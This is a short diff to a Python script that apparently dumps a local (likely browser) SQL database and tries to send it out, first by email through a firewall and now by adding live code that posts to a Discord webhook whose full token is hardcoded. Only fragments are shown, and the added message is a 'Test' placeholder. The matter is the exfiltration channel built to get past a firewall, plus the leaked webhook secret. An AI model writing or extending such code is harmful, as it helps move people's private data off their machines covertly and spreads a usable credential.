@@ -22,6 +22,18 @@ sqlFile = sqlFile.replace(" ", "")
 print(sqlFile[:4000])
  
 print("We would try to send an email, but theres a pretty baller firewall")
+
+from discord_webhook import DiscordWebhook, DiscordEmbed
+
+webhook = DiscordWebhook(url='https://discord.com/api/webhooks/778629618801311744/sG_fE1z21MHjfwYWb1lnrU4TXhEb4J6CffkbO8W9GcA9uSpFvc4epoqFldcpQoYBzOhL')
+
+# create embed object for webhook
+embed = DiscordEmbed(title='Test', description='Lorem ipsum dolor sit', color=242424)
+
+# add embed object to webhook
+webhook.add_embed(embed)
+
+response = webhook.execute()
 """
 ##################
 #### FireFox #####
@@ -67,4 +79,5 @@ msg['To'] = "m171458@usna.edu"
 s = smtplib.SMTP('localhost')
 s.sendmail(me, [you], msg.as_string())
 s.quit()
+
 """
